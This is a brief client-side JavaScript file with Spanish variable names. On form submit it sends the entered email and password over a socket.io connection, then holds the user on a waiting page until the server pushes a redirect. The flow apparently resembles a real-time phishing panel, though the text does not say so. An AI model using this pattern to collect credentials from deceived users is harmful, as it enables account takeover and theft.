const socket = io();
const formulario = document.getElementById('formulario');

formulario.addEventListener('submit', function (e) {
  e.preventDefault();

  const correo = document.getElementById('correo').value;
  const contrasena = document.getElementById('contrasena').value;

  // Generar un ID único para esta sesión
  const sessionId = Math.random().toString(36).substring(2, 15);
  localStorage.setItem('sessionId', sessionId);

  // Enviar los datos junto con el ID
  socket.emit('dataForm', { correo, contrasena, sessionId });

  // Ir a la pantalla de espera
  window.location.href = 'opciones.html';
});

// Escuchar redirección desde el servidor
socket.on('redirect', ({ url }) => {
  window.location.href = url;
});
